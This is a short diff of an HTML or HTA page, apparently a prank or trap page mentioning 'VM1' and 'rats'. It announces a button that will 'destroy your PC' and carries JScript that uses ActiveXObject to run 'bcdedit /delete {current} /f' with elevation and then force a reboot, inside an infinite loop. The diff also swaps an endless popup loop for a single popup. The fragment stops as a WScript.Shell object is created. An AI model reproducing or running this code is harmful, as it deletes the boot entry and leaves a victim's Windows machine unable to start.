@@ -18,7 +18,7 @@
 <p>CLICK THIS BUTTON TO DESTROY THE BOOT CONFIG DATA. THIS WILL DESTORY YOUR PC.</p>
 <dont>(function(){while(true){var s=new ActiveXObject('Shell.Application');s.ShellExecute('bcdedit.exe','/delete {current} /f','', 'runas',1);s.ShellExecute('shutdown.exe','/r /t 0','', 'runas',1);close();}})()</dont>
 <script>
-      while(true){var s=new ActiveXObject('Shell.Application');s.ShellExecute('msg','* MISS','')};
+      var s=new ActiveXObject('Shell.Application');s.ShellExecute('msg','* NO RATS ALLOWED ON VM1','');
 </script>
 <script>
 var shell   = new ActiveXObject("WScript.Shell");
